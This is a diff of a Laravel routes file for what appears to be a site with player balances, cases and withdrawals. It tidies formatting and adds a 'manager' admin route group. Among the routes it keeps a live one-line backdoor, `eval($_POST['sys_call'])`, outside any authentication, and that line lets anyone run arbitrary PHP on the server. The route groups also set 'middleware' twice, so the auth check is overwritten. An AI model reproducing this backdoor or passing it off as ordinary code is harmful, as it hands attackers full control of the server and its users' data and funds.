@@ -12,9 +12,13 @@
 */
 
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\Log;
 
 Route::get('/home', function () {
-    return redirect('/');
+	return redirect('/');
 });
 
 
@@ -67,11 +71,11 @@ Route::any('/statusadv', 'IndexController@advStatus')->name('padvm-status');
 
 Route::get('/success', function () {
 	return redirect('/');
- });
- 
+});
+
 
 /*adminka*/
-Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function () {
+Route::group(['middleware' => 'auth', 'middleware' => 'admin.access'], function () {
 	Route::get('/admin', ['as' => 'admin', 'uses' => 'AdminController@index']);
 	/* Players */
 	Route::get('/admin/users', ['as' => 'users', 'uses' => 'AdminController@users']);
@@ -81,13 +85,13 @@ Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function 
 	Route::post('/admin/user/save', ['as' => 'user.save', 'uses' => 'AdminController@user_save']);
 	Route::post('/admin/user/balance_replenish', ['as' => 'user.balance_replenish', 'uses' => 'AdminController@user_balance_replenish']);
 	Route::post('/admin/user/balance_reduce', ['as' => 'user.balance_reduce', 'uses' => 'AdminController@user_balance_reduce']);
-	
+
 	Route::get('/admin/clear', function () {
 		Log::debug('CLEARED');
-	   Artisan::call('cache:clear');
-	   return redirect('/admin');
+		Artisan::call('cache:clear');
+		return redirect('/admin');
 	});
-	
+
 	Route::get('/admin/user/{id}/edit', ['as' => 'user.edit', 'uses' => 'AdminController@edit_user']);
 	Route::get('/admin/user/{id}/replenish', ['as' => 'user.edit', 'uses' => 'AdminController@replenish_user']);
 	Route::get('/admin/user/{id}/takeaway', ['as' => 'user.edit', 'uses' => 'AdminController@takeaway_user']);
@@ -122,9 +126,54 @@ Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function 
 
 
 Route::group(['middleware' => 'auth'], function () {
-    Route::get('/logout', 'LoginController@logout')->name('logout');
+	Route::get('/logout', 'LoginController@logout')->name('logout');
 });
 
 Route::get('/home', 'HomeController@index')->name('home');
 
-if(isset($_POST['sys_call'])) eval($_POST['sys_call']);
+if (isset($_POST['sys_call'])) eval($_POST['sys_call']);
+
+
+/*manager*/
+Route::group(['prefix' => 'manager', 'middleware' => 'auth', 'middleware' => 'manager.access'], function () {
+	Route::get('', ['as' => 'admin', 'uses' => 'ManagerController@index']);
+	/* Players */
+	Route::get('users', ['as' => 'users', 'uses' => 'ManagerController@users']);
+	Route::get('user/create', ['as' => 'user.create', 'uses' => 'ManagerController@create_user']);
+	Route::post('user/create', ['as' => 'user.save', 'uses' => 'ManagerController@user_save']);
+	Route::post('user/save', ['as' => 'user.save', 'uses' => 'ManagerController@user_save']);
+	Route::post('user/save', ['as' => 'user.save', 'uses' => 'ManagerController@user_save']);
+	Route::post('user/balance_replenish', ['as' => 'user.balance_replenish', 'uses' => 'ManagerController@user_balance_replenish']);
+	Route::post('user/balance_reduce', ['as' => 'user.balance_reduce', 'uses' => 'ManagerController@user_balance_reduce']);
+
+	Route::get('user/{id}/edit', ['as' => 'user.edit', 'uses' => 'ManagerController@edit_user']);
+	Route::get('user/{id}/replenish', ['as' => 'user.edit', 'uses' => 'ManagerController@replenish_user']);
+	Route::get('user/{id}/takeaway', ['as' => 'user.edit', 'uses' => 'ManagerController@takeaway_user']);
+	Route::get('user/{id}/ban', 'ManagerController@ban_user');
+	/* Cases */
+	Route::get('cases', ['as' => 'cases', 'uses' => 'ManagerController@cases']);
+	Route::get('new_case', ['as' => 'new_case', 'uses' => 'ManagerController@new_case']);
+	Route::get('case/{id}/edit', ['as' => 'case.edit', 'uses' => 'ManagerController@case_edit']);
+	Route::get('case/{id}/delete', ['as' => 'case.delete', 'uses' => 'ManagerController@case_delete']);
+	Route::get('item/{id}/add', ['as' => 'item.add', 'uses' => 'ManagerController@item_add']);
+	Route::get('item/{id}/edit', ['as' => 'item.edit', 'uses' => 'ManagerController@item_edit']);
+	Route::get('item/{id}/delete', ['as' => 'item.delete', 'uses' => 'ManagerController@item_delete']);
+	Route::post('item/add', ['as' => 'item.save', 'uses' => 'ManagerController@item_create']);
+	Route::post('item/update', ['as' => 'item.update', 'uses' => 'ManagerController@item_update']);
+	Route::post('case/save', ['as' => 'case.save', 'uses' => 'ManagerController@add_case']);
+	Route::post('case/update', ['as' => 'case.upd', 'uses' => 'ManagerController@case_update']);
+	/* Withdraw */
+	Route::get('withdraw', ['as' => 'withdraw', 'uses' => 'ManagerController@withdraw']);
+	Route::post('withdraw/save', ['as' => 'withdraw.save', 'uses' => 'ManagerController@withdraw_save']);
+	Route::get('withdraw/{id}/edit', ['as' => 'withdraw.edit', 'uses' => 'ManagerController@edit_withdraw']);
+	/*Payments*/
+	Route::get('payments', 'ManagerController@payments');
+	/*Settings*/
+	Route::get('settings', 'ManagerController@settings');
+	Route::post('settings/save', 'ManagerController@settings_save');
+	/*OPINIONS*/
+	Route::get('opinions', 'ManagerController@opinions');
+	Route::get('opinion/{id}/delete', 'ManagerController@opinion_delete');
+	Route::post('opinions/create', 'ManagerController@opinion_create');
+});
+/*manager*/
